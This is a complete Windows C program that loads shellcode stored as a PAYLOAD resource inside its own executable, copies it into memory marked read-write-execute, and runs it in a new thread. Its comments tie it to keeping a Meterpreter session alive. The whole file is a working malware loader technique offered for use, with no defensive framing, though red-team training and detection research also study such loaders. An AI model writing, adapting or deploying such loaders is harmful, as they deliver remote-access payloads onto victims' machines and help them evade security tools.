#include <windows.h>
#include <stdio.h>

int main() {

  // Locate the shellcode resource inside the executable
  HRSRC hRes = FindResource(
    NULL,                 // Current module (this EXE)
    "PAYLOAD",            // Resource name (must match .rc file)
    RT_RCDATA             // Raw binary data
  );

  if (hRes == NULL) {
    return -1;
  }

  // Load the resource into memory
  HGLOBAL hData = LoadResource(NULL, hRes);
  if (hData == NULL) {
    return -1;
  }

  // Get a pointer to the raw shellcode bytes
  unsigned char *buf = (unsigned char *)LockResource(hData);

  // Get the size of the shellcode
  DWORD bufSize = SizeofResource(NULL, hRes);

  // Allocate RWX memory in the current process
  void *exec = VirtualAlloc(
    NULL,                       // Let Windows choose address
    bufSize,                    // Size of shellcode
    MEM_COMMIT | MEM_RESERVE,   // Allocate memory
    PAGE_EXECUTE_READWRITE      // RWX permissions
  );

  // Copy shellcode into executable memory
  memcpy(exec, buf, bufSize);

  // Execute shellcode in a new thread (important for Meterpreter)
  HANDLE hThread = CreateThread(
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)exec,
    NULL,
    0,
    NULL
  );

  // Wait forever (Meterpreter stays alive)
  WaitForSingleObject(hThread, INFINITE);

  return 0;
}
